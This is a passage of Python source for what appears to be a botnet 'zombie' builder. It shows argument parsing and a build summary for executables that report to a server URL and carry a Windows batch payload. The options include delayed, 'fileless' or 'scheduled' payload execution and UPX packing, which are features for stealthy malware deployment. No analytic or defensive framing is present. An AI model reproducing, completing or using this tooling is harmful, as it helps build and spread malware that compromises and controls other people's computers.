    parser.add_argument('--icon', type=str, help='Path to custom icon file')
    
    parser.add_argument('--payload', type=str, help='Path to batch script payload for Windows builds')
    
    parser.add_argument('--payload-delay', type=int, default=30, 
                      help='Delay before executing payload in seconds (default: 30)')
    
    parser.add_argument('--payload-technique', choices=['direct', 'fileless', 'scheduled'],
                      default='direct', 
                      help='Payload execution technique (default: direct)')
    
    parser.add_argument('--upx', action='store_true', help='Enable UPX compression')
    
    parser.add_argument('--debug', action='store_true', help='Enable debug output')
    
    parser.add_argument('--output', type=str, default='./dist',
                      help='Output directory (default: ./dist)')
    
    return parser.parse_args()


def main():
    """Main function"""
    print(f"Zombie Build Utility v{VERSION}")
    print("===========================")
    
    args = parse_arguments()
    builder = ZombieBuilder(args)
    success, metadata = builder.build()
    
    if success:
        print("\nBuild Summary:")
        print(f"  Platform:    {metadata['platform']}")
        print(f"  Build ID:    {metadata['build_id']}")
        print(f"  Zombie ID:   {metadata['zombie_id']}")
        print(f"  Executable:  {metadata['executable']}")
        print(f"  Server URL:  {metadata['server_url']}")
        
        if 'payload' in metadata:
            print("\nPayload Information:")
            print(f"  Source:      {metadata['payload']['source']}")
            print(f"  Size:        {metadata['payload']['size']} bytes")
            print(f"  Technique:   {metadata['payload']['technique']}")
            print(f"  Delay:       {metadata['payload']['delay']} seconds")
        
        print(f"\nBuild completed successfully! Executable saved to: {os.path.join(builder.output_dir, metadata['executable'])}")
    else:
        print("\nBuild failed! Check the log file for details.")
        sys.exit(1)


if __name__ == '__main__':
    main()
